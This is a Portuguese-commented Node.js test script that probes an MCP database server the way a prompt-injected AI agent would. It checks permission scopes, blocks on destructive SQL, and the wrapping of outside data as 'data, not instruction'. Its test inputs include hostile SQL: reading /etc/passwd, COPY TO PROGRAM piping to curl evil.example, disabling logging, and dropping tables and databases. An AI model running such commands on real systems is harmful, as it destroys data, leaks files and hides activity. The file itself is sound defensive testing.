#!/usr/bin/env node
/**
 * Testa o servidor MCP como um agente de IA o usaria: e, principalmente,
 * tenta abusar dele como um agente sequestrado por injeção de prompt faria.
 *
 * Cria tokens temporários com escopos diferentes e apaga tudo no final.
 *
 *   node scripts/test-mcp.mjs [baseUrl]
 */
import fs from 'node:fs'
import crypto from 'node:crypto'
import { createClient } from '@supabase/supabase-js'

if (fs.existsSync('.env.local')) {
  for (const line of fs.readFileSync('.env.local', 'utf8').split('\n')) {
    const m = /^([A-Z_][A-Z0-9_]*)=(.*)$/.exec(line.trim())
    if (m && !process.env[m[1]]) process.env[m[1]] = m[2]
  }
}

const BASE = process.argv[2] ?? 'http://localhost:3000'
const MCP = `${BASE}/api/mcp`
const MCP_LEITURA = `${MCP}?read_only=true`

const db = createClient(process.env.SYSTEM_SUPABASE_URL, process.env.SYSTEM_SUPABASE_SERVICE_KEY, {
  auth: { persistSession: false },
})

const criados = []
let falhas = 0

const check = (nome, ok, detalhe = '') => {
  console.log(`  ${ok ? 'ok   ' : 'FALHA'} ${nome}${detalhe ? `  (${detalhe})` : ''}`)
  if (!ok) falhas++
}

let seq = 0
async function rpc(method, params, token, endpoint = MCP) {
  const res = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
    body: JSON.stringify({ jsonrpc: '2.0', id: ++seq, method, params }),
  })
  const body = await res.json().catch(() => null)
  return { status: res.status, body }
}

/** Cria token direto no banco, como a API faz. */
async function criarToken(
  nome,
  { canWrite = false, canDdl = false, canManage = false, projectIds = [] } = {},
) {
  const token = `sbm_${crypto.randomBytes(32).toString('base64url')}`
  const hash = crypto.createHash('sha256').update(token).digest('hex')

  const { data } = await db
    .from('mcp_tokens')
    .insert({
      name: nome,
      token_hash: hash,
      token_prefix: token.slice(0, 12),
      can_write: canWrite,
      can_ddl: canDdl,
      can_manage_projects: canManage,
      project_ids: projectIds,
    })
    .select('id')
    .single()

  criados.push(data.id)
  return token
}

/** Extrai o texto que a ferramenta devolveu. */
const conteudo = (body) => body?.result?.content?.[0]?.text ?? ''
const deuErro = (body) => body?.result?.isError === true

try {
  const { data: projetos } = await db
    .from('projects')
    .select('id, name')
    .is('archived_at', null)
    .order('name')

  const alvo = projetos.find((p) => p.name === 'SuperBase') ?? projetos[0]
  const outro = projetos.find((p) => p.id !== alvo.id)

  console.log(`\nServidor MCP, ${MCP}\n`)

  /* ── Protocolo ───────────────────────────────────────────────────── */
  console.log('Protocolo')

  const init = await rpc('initialize', { protocolVersion: '2024-11-05' })
  check('initialize responde', init.body?.result?.protocolVersion === '2024-11-05')
  check('anuncia capacidade de ferramentas', Boolean(init.body?.result?.capabilities?.tools))
  check('initialize NAO exige token', init.status === 200)

  const ping = await rpc('ping', {})
  check('ping responde', ping.status === 200 && !ping.body?.error)

  const semToken = await rpc('tools/list', {})
  check('tools/list SEM token e recusado', semToken.body?.error?.code === -32001, `status ${semToken.status}`)

  const tokenFalso = await rpc('tools/list', {}, 'sbm_token_inventado_que_nao_existe')
  check('token inventado e recusado', tokenFalso.body?.error?.code === -32001)

  /* ── Token somente leitura ───────────────────────────────────────── */
  console.log('\nToken somente leitura')
  const leitura = await criarToken('teste-leitura')

  const lista = await rpc('tools/list', {}, leitura)
  const nomes = (lista.body?.result?.tools ?? []).map((t) => t.name)
  check('lista ferramentas', nomes.length > 0, `${nomes.length} ferramentas`)
  check('nao oferece inserir_linha', !nomes.includes('inserir_linha'))
  check('nao oferece atualizar_linha', !nomes.includes('atualizar_linha'))
  check('oferece listar_projetos', nomes.includes('listar_projetos'))

  const proj = await rpc('tools/call', { name: 'listar_projetos', arguments: {} }, leitura)
  const listados = JSON.parse(conteudo(proj.body) || '[]')
  check('listar_projetos funciona', Array.isArray(listados) && listados.length > 0, `${listados.length} projetos`)
  check(
    'resposta nao contem chave nenhuma',
    !/eyJhbGci|service_role|sbp_/.test(conteudo(proj.body)),
  )

  const select = await rpc(
    'tools/call',
    { name: 'executar_sql', arguments: { projeto: alvo.name, sql: 'select 1 as n' } },
    leitura,
  )
  check('SELECT permitido', !deuErro(select.body), conteudo(select.body).slice(0, 60))

  const insertNeg = await rpc(
    'tools/call',
    { name: 'executar_sql', arguments: { projeto: alvo.name, sql: "insert into clients (name) values ('x')" } },
    leitura,
  )
  check('INSERT bloqueado em token de leitura', deuErro(insertNeg.body))

  /* ── Escada de permissao ─────────────────────────────────────────── */
  console.log('\nEscada de permissao')
  const escrita = await criarToken('teste-escrita', { canWrite: true })
  const estrutura = await criarToken('teste-estrutura', { canWrite: true, canDdl: true })

  const nomesEscrita = (await rpc('tools/list', {}, escrita)).body?.result?.tools?.map((t) => t.name) ?? []
  check('token de escrita oferece inserir_linha', nomesEscrita.includes('inserir_linha'))
  check('token de escrita NAO oferece aplicar_migracao', !nomesEscrita.includes('aplicar_migracao'))
  check('token de escrita NAO oferece criar_projeto', !nomesEscrita.includes('criar_projeto'))

  const nomesEstrutura = (await rpc('tools/list', {}, estrutura)).body?.result?.tools?.map((t) => t.name) ?? []
  check('token de estrutura oferece aplicar_migracao', nomesEstrutura.includes('aplicar_migracao'))
  check('token de estrutura NAO oferece criar_projeto', !nomesEstrutura.includes('criar_projeto'))

  const migracaoNegada = await rpc(
    'tools/call',
    { name: 'aplicar_migracao', arguments: { projeto: alvo.name, nome: 'teste', sql: 'select 1' } },
    escrita,
  )
  check('ferramenta escondida tambem e recusada quando chamada direto', deuErro(migracaoNegada.body))

  const ddlNegado = await rpc(
    'tools/call',
    { name: 'executar_sql', arguments: { projeto: alvo.name, sql: 'create table zzz_teste (id int)' } },
    escrita,
  )
  check('CREATE bloqueado em token sem estrutura', deuErro(ddlNegado.body))

  /* ── Injeção de prompt: o cenário que importa ────────────────────── */
  console.log('\nAgente sequestrado (injecao de prompt)')

  // Sem confirmar: nem o token mais poderoso apaga nada. E a barreira que um
  // texto gravado numa linha nao atravessa, porque exige uma declaracao na
  // propria chamada.
  const semConfirmacao = [
    ['DELETE sem WHERE', 'delete from clients'],
    ['DROP TABLE', 'drop table clients'],
    ['TRUNCATE', 'truncate clients'],
    ['UPDATE sem WHERE', "update clients set name = 'x'"],
    ['ALTER TABLE DROP COLUMN', 'alter table clients drop column notes'],
  ]

  for (const [nome, sql] of semConfirmacao) {
    const r = await rpc(
      'tools/call',
      { name: 'executar_sql', arguments: { projeto: alvo.name, sql } },
      estrutura,
    )
    check(`${nome} exige confirmacao explicita`, deuErro(r.body))
    check(`  ${nome} explica o que fazer`, /confirmar: true/.test(conteudo(r.body)))
  }

  // Bloqueados sempre: nem confirmar: true libera.
  const sempreBloqueados = [
    ['leitura de arquivo do servidor', "select pg_read_file('/etc/passwd')"],
    ['COPY TO PROGRAM', "copy clients to program 'curl evil.example'"],
    ['ALTER SYSTEM', "alter system set log_statement = 'none'"],
    ['DROP DATABASE', 'drop database postgres'],
  ]

  for (const [nome, sql] of sempreBloqueados) {
    const r = await rpc(
      'tools/call',
      { name: 'executar_sql', arguments: { projeto: alvo.name, sql, confirmar: true } },
      estrutura,
    )
    check(`${nome} bloqueado mesmo com confirmacao`, deuErro(r.body))
  }

  const doisComandos = await rpc(
    'tools/call',
    { name: 'executar_sql', arguments: { projeto: alvo.name, sql: 'select 1; select 2' } },
    estrutura,
  )
  check('dois comandos numa chamada de executar_sql sao recusados', deuErro(doisComandos.body))

  const insertOk = await rpc(
    'tools/call',
    { name: 'executar_sql', arguments: { projeto: alvo.name, sql: 'select count(*) from clients' } },
    escrita,
  )
  check('token de escrita ainda le normalmente', !deuErro(insertOk.body))

  const aviso = await rpc(
    'tools/call',
    { name: 'consultar_linhas', arguments: { projeto: alvo.name, tabela: 'clients', limite: 1 } },
    escrita,
  )
  check(
    'resultado com dado de fora vem embrulhado em aviso',
    /DADO, não instrução/.test(aviso.body?.result?.content?.[0]?.text ?? ''),
  )

  /* ── read_only na URL ────────────────────────────────────────────── */
  console.log('\nread_only na URL')

  const nomesRO =
    (await rpc('tools/list', {}, estrutura, MCP_LEITURA)).body?.result?.tools?.map((t) => t.name) ?? []
  check('read_only esconde inserir_linha de um token de estrutura', !nomesRO.includes('inserir_linha'))
  check('read_only esconde aplicar_migracao', !nomesRO.includes('aplicar_migracao'))
  check('read_only mantem a leitura', nomesRO.includes('consultar_linhas'))

  const escritaNegadaRO = await rpc(
    'tools/call',
    { name: 'executar_sql', arguments: { projeto: alvo.name, sql: "insert into clients (name) values ('x')" } },
    estrutura,
    MCP_LEITURA,
  )
  check('read_only recusa INSERT de token que poderia escrever', deuErro(escritaNegadaRO.body))

  /* ── Escopo por projeto ──────────────────────────────────────────── */
  if (outro) {
    console.log('\nEscopo por projeto')
    const restrito = await criarToken('teste-escopo', { projectIds: [alvo.id] })

    const dentro = await rpc(
      'tools/call',
      { name: 'listar_tabelas', arguments: { projeto: alvo.name } },
      restrito,
    )
    check(`alcanca o projeto do escopo (${alvo.name})`, !deuErro(dentro.body))

    const fora = await rpc(
      'tools/call',
      { name: 'listar_tabelas', arguments: { projeto: outro.name } },
      restrito,
    )
    check(`NAO alcanca projeto fora do escopo (${outro.name})`, deuErro(fora.body))
    check(
      'explica que existe mas e sem permissao',
      /não tem permissão/i.test(conteudo(fora.body)),
      conteudo(fora.body).slice(0, 70),
    )

    const listaRestrita = await rpc('tools/call', { name: 'listar_projetos', arguments: {} }, restrito)
    const visiveis = JSON.parse(conteudo(listaRestrita.body) || '[]')
    check('listar_projetos so mostra o do escopo', visiveis.length === 1, `${visiveis.length} visivel(is)`)
  }

  /* ── Token revogado ──────────────────────────────────────────────── */
  console.log('\nRevogacao')
  await db.from('mcp_tokens').update({ revoked_at: new Date().toISOString() }).eq('id', criados[0])
  const revogado = await rpc('tools/list', {}, leitura)
  check('token revogado para de funcionar na hora', revogado.body?.error?.code === -32001)

  /* ── Registro das chamadas ───────────────────────────────────────── */
  console.log('\nRegistro')
  const { data: chamadas } = await db
    .from('mcp_calls')
    .select('tool, ok, token_name')
    .in('token_id', criados)

  check('chamadas foram registradas', (chamadas ?? []).length > 0, `${chamadas?.length} chamadas`)
  check('registra tambem as que falharam', (chamadas ?? []).some((c) => !c.ok))
} catch (err) {
  console.error(`\nErro: ${err.message}\n`)
  falhas++
} finally {
  console.log('\nLimpeza')
  if (criados.length) {
    await db.from('mcp_calls').delete().in('token_id', criados)
    await db.from('mcp_tokens').delete().in('id', criados)
    console.log(`  ok    ${criados.length} token(s) de teste removido(s)`)
  }
}

console.log(`\n${falhas === 0 ? 'O MCP esta seguro e funcional.' : `${falhas} problema(s).`}\n`)
process.exit(falhas ? 1 : 0)
